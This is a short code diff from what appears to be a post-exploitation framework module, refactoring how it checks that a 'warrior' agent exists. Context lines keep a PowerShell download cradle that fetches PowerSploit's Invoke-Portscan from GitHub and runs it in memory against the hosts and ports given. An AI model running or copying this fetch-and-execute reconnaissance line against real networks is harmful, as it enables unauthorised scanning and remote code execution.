@@ -1,5 +1,5 @@
 from module import Module
-
+from warrior_check import exist_warrior
 
 class CustomModule(Module):
     def __init__(self):
@@ -21,13 +21,7 @@ class CustomModule(Module):
 
     # This module must be always implemented, it is called by the run option
     def run_module(self):
-        warrior_exist = False
-            for p in Path("/tmp/").glob("ibs-*"):
-                if str(p)[9:] == self.args["warrior"]:
-                    warrior_exist = True
-                    break
-
-            if warrior_exist:
+            if exist_warrior(self.args["warrior"]):
                 function = "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1')"
                 function += 'Invoke-Portscan -Hosts {} -ports {}'.format(self.args["hosts"], self.args["port"])
 
